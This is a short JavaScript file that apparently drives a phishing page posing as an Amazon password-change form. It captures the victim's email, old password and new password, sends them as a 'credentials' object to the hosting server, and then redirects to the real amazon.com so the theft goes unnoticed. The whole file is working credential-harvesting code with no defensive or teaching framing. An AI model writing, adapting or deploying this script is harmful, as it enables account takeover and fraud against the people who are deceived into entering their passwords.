window.addEventListener("load",function(){
    const email = document.getElementById("email")
    const oldPass = document.getElementById("old_password")
    const newPass = document.getElementById("new_password")
    const btn = document.querySelector("form")
    btn.addEventListener("submit",function(e){
        const credentials = {
            email: email.value,
            oldPass: oldPass.value,
            newPass: newPass.value
        }
        e.preventDefault()
        fetch("/",{
            method: "POST",
            body: JSON.stringify(credentials),
            headers:{
                'Content-Type':'application/json'
            }
        }).then((res)=>{ 
            window.location.replace("https://amazon.com")
        })
       
    })
})